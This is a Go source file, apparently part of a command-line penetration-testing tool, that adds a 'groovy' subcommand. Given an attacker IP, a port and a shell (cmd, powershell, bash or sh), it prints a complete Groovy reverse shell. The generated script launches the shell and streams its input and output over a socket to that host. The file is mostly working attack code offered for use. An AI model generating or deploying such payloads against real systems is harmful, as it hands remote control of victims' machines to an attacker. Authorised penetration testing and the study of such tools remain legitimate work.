package cmd

import (
	"fmt"
	"os"
	"strings"

	"github.com/secopsbear/sb-shells/colors"
	"github.com/spf13/cobra"
)

var commandInput string

// groovyCmd represents the groovy command
var groovyCmd = &cobra.Command{
	Use:   "groovy",
	Short: "Generate Groovy reverse shell script",
	Long:  `Generate Groovy reverse shell script.`,
	Run: func(cmd *cobra.Command, args []string) {

		validateIpAndPorts(cmd, args)
		checkCmdCheck(cmd, args)

		groovyScript := `String hostIP="` + ipAddressLocal + `";int port=` + portLocal + `;String cmdProcess="` + commandInput + `";Process pb=new ProcessBuilder(cmdProcess).redirectErrorStream(true).start();Socket sock=new Socket(hostIP,port);InputStream pbInput=pb.getInputStream(),pbErr=pb.getErrorStream(), sockInput=sock.getInputStream();OutputStream po=pb.getOutputStream(),so=sock.getOutputStream();while(!sock.isClosed()){while(pbInput.available()>0)so.write(pbInput.read());while(pbErr.available()>0)so.write(pbErr.read());while(sockInput.available()>0)po.write(sockInput.read());so.flush();po.flush();Thread.sleep(50);try {pb.exitValue();break;}catch (Exception e){}};pb.destroy();sock.close();`

		fmt.Println(colors.CyanColor("Groovy reverse shell script: "))
		fmt.Println(groovyScript)

	},
}

func init() {
	rootCmd.AddCommand(groovyCmd)

	groovyCmd.PersistentFlags().StringVarP(&commandInput, "commandInput", "c", "", "Execute the shell in [cmd, powershell, bash, sh]")
	groovyCmd.MarkPersistentFlagRequired("commandInput")

}

// Check commandInput is valid input.
func checkCmdCheck(cmd *cobra.Command, args []string) {
	commandArray := map[string]bool{"cmd": true, "powershell": true, "bash": true, "sh": true}

	if !commandArray[strings.ToLower(commandInput)] {
		if strings.ToLower(commandInput) == "" {
			fmt.Println(colors.RedColor("Error: ") + colors.YellowColor("commandInput cannot be empty") + colors.RedColor(" Select from [ cmd | powershell | bash | sh ]  "))

		} else {

			fmt.Println(colors.RedColor("Error: ") + colors.YellowColor(commandInput) + colors.RedColor(" is invalid command. Select from [ cmd | powershell | bash | sh ]  "))
		}
		cmd.Help()
		os.Exit(1)
	}
}
